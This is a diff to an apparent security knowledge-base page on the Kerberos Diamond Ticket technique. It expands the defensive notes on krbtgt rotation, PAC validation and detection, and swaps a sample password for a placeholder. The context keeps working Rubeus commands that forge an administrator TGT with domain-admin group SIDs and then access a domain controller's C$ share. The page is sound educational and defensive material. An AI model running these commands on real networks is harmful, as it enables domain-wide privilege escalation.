@@ -2,11 +2,13 @@
 
 Modifying legitimate tickets to bypass detection of forged tickets.
 
+**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/) Steal or Forge Kerberos Tickets
+
 A Diamond Ticket is a modified legitimate TGT. Where a [Golden Ticket](../forgery/golden-ticket.md) is
 forged from scratch and has detectable anomalies in its metadata, a Diamond Ticket starts with a
 real TGT obtained through a normal [AS Exchange](../../protocol/as-exchange.md) and then surgically
 modifies only the [PAC](../../protocol/tickets.md#pac) contents. The result is a ticket with
-legitimate timestamps, correct sequence numbers, and proper structure -- but with elevated
+legitimate timestamps, flags, and proper structure -- but with elevated
 privileges injected into the authorization data.
 
 ---
@@ -80,8 +82,9 @@ defenses, since both require the `krbtgt` key.
 
 ### KRBTGT Password Rotation
 
-Same as Golden Ticket -- rotate the `krbtgt` password twice, with a full replication cycle
-between changes. A Diamond Ticket depends on the `krbtgt` key to decrypt, modify, and re-encrypt
+Same as Golden Ticket -- rotate the `krbtgt` password twice, with a full replication cycle and
+at least the maximum ticket lifetime (10 hours by default) between changes (see
+[Golden Ticket -- Defend](golden-ticket.md#krbtgt-password-rotation)). A Diamond Ticket depends on the `krbtgt` key to decrypt, modify, and re-encrypt
 the TGT. Once the key is rotated, the attacker's ability to create new Diamond Tickets is gone.
 
 ### Restrict DCSync Privileges
@@ -96,8 +99,11 @@ exposed on lower-tier systems.
 
 ### PAC Content Validation
 
-The most effective defense specific to Diamond Tickets is **cross-referencing PAC claims with
-Active Directory at service access time**:
+No Windows setting does this for you. The KDC copies the fields of the TGT's PAC into each
+service ticket without looking the group memberships up again
+([MS-KILE &sect;3.3.5.7](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2e5dcf34-4b51-44a0-b45a-277ed616ca39)),
+so the measure specific to Diamond Tickets is a detection rather than a control:
+**cross-referencing PAC claims with Active Directory at service access time**:
 
 - When a service receives a ticket, compare the group SIDs in the PAC against the user's actual
   group memberships in AD
@@ -144,7 +150,7 @@ Since the ticket metadata is clean, detection shifts to behavioral analysis:
 |---|---|
 | PAC mismatch | Group SIDs in the PAC do not match the user's actual AD group memberships |
 | Account behavior change | Low-privilege account suddenly performing high-privilege actions |
-| TGT reuse anomaly | The same TGT session key used across an unusually long period (attacker repeatedly re-modifying) |
+| TGT reuse anomaly | The same TGT session key used across an unusually long period (attacker repeatedly re-modifying). Not visible in the Security log: events 4768 and 4769 record the session key's encryption type, not the key |
 | Defender for Identity alerts | Microsoft's tool specifically detects PAC manipulation |
 
 ---
@@ -172,7 +178,7 @@ Same as Golden Ticket:
 
     ```bash
     # Using Rubeus
-    Rubeus.exe asktgt /user:jsmith /password:Summer2024! /domain:CORP.LOCAL
+    Rubeus.exe asktgt /user:jsmith /password:<password> /domain:CORP.LOCAL
     ```
 
     This generates a real TGT with legitimate metadata and logs Event 4768 on the DC.
@@ -181,7 +187,7 @@ Same as Golden Ticket:
 
     ```bash
     # Using Rubeus diamond command
-    Rubeus.exe diamond /krbkey:<aes256_key> /user:jsmith /password:Summer2024! /domain:CORP.LOCAL /dc:dc01.corp.local /enctype:aes256 /ticketuser:administrator /ticketuserid:500 /groups:512,519 /ptt
+    Rubeus.exe diamond /krbkey:<aes256_key> /user:jsmith /password:<password> /domain:CORP.LOCAL /dc:dc1.corp.local /enctype:aes256 /ticketuser:administrator /ticketuserid:500 /groups:512,519 /ptt
     ```
 
     Rubeus performs the full flow in one command: requests a TGT, decrypts it with the `krbtgt`
@@ -191,7 +197,7 @@ Same as Golden Ticket:
 4. **Use the modified TGT**:
 
     ```
-    dir \\dc01.corp.local\c$
+    dir \\dc1.corp.local\c$
     ```
 
     The KDC accepts the modified TGT because it is encrypted and signed with the correct
@@ -207,5 +213,5 @@ Same as Golden Ticket:
 
 | Tool | Command | Notes |
 |---|---|---|
-| Rubeus | `Rubeus.exe diamond /krbkey:<key> /user:jsmith /password:pass /enctype:aes256 /ticketuser:administrator /groups:512 /ptt` | Full flow: request, decrypt, modify, re-encrypt, inject |
+| Rubeus | `Rubeus.exe diamond /krbkey:<key> /user:jsmith /password:<password> /enctype:aes256 /ticketuser:administrator /groups:512 /ptt` | Full flow: request, decrypt, modify, re-encrypt, inject |
 | impacket | `ticketer.py` with custom PAC modification scripts | Requires manual PAC manipulation; no single built-in command |
